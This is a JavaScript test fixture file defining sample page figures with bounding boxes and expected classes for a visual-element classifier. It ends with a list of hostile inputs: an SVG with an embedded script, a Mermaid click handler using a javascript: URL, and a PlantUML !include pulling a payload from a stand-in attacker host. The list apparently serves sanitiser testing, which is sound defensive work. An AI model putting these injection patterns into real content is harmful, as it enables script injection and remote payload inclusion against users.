const source = (kind, assetId, cropId = assetId) => ({
  kind,
  assetId,
  spanIds: [],
  objectIds: [`${assetId}-object`],
  cropIds: [cropId],
});

export const VISUAL_IR_FIXTURES = Object.freeze([
  {
    id: "vector-flowchart",
    page: 1,
    bbox: [72, 120, 420, 300],
    source: source("vector", "flowchart-asset"),
    candidate: {
      nodes: [
        { id: "start", label: "Start", shape: "rounded-box", bbox: [80, 140, 180, 180] },
        { id: "end", label: "End", shape: "box", bbox: [280, 220, 380, 260] },
      ],
      edges: [{ id: "edge-1", source: "start", target: "end", directed: true }],
    },
    expectedClass: "graph-flowchart",
  },
  {
    id: "raster-diagram",
    page: 2,
    bbox: [64, 180, 540, 480],
    source: source("raster", "raster-diagram"),
    images: [{ id: "raster-diagram", bbox: [64, 180, 540, 480] }],
    caption: "Figure 2. Experimental setup diagram",
    expectedClass: "diagram",
  },
  {
    id: "chart-without-data",
    page: 3,
    bbox: [80, 200, 520, 520],
    source: source("vector", "chart-asset"),
    vectors: [
      { id: "axis-x", bbox: [100, 500, 500, 502], flags: { stroked: true } },
      { id: "axis-y", bbox: [100, 220, 102, 500], flags: { stroked: true } },
    ],
    caption: "Figure 3. Quarterly chart",
    expectedClass: "chart",
  },
  {
    id: "ordinary-image",
    page: 4,
    bbox: [72, 160, 540, 500],
    source: source("raster", "photo-asset"),
    images: [{ id: "photo-asset", bbox: [72, 160, 540, 500] }],
    caption: "Figure 4. Sample photograph",
    expectedClass: "ordinary-image",
  },
  {
    id: "academic-figure",
    page: 5,
    bbox: [72, 190, 540, 430],
    source: source("mixed", "academic-figure"),
    images: [{ id: "academic-figure", bbox: [72, 190, 540, 430] }],
    caption: "Figure 5. Academic results",
    expectedClass: "ordinary-image",
  },
  {
    id: "logo",
    page: 6,
    bbox: [32, 24, 128, 64],
    source: source("raster", "logo-asset"),
    images: [{ id: "logo-asset", bbox: [32, 24, 128, 64] }],
    classHint: "logo",
    expectedClass: "logo",
  },
  {
    id: "decoration",
    page: 7,
    bbox: [72, 92, 540, 94],
    source: source("vector", "separator-asset"),
    vectors: [{ id: "rule", bbox: [72, 92, 540, 94], kind: "separator" }],
    classHint: "separator",
    expectedClass: "separator",
  },
  {
    id: "mixed-scanned-page",
    page: 8,
    bbox: [0, 0, 612, 792],
    source: source("source-page", "scanned-page"),
    sourceKind: "source-page",
    expectedClass: "background",
  },
]);

export const MALICIOUS_VISUAL_FIXTURES = Object.freeze([
  '<svg><script>alert(1)</script></svg>',
  'flowchart LR\n  n1["x"]\n  n1 --> n1\n  click n1 "javascript:alert(1)"',
  '@startuml\n!include https://evil.invalid/payload\n@enduml',
]);
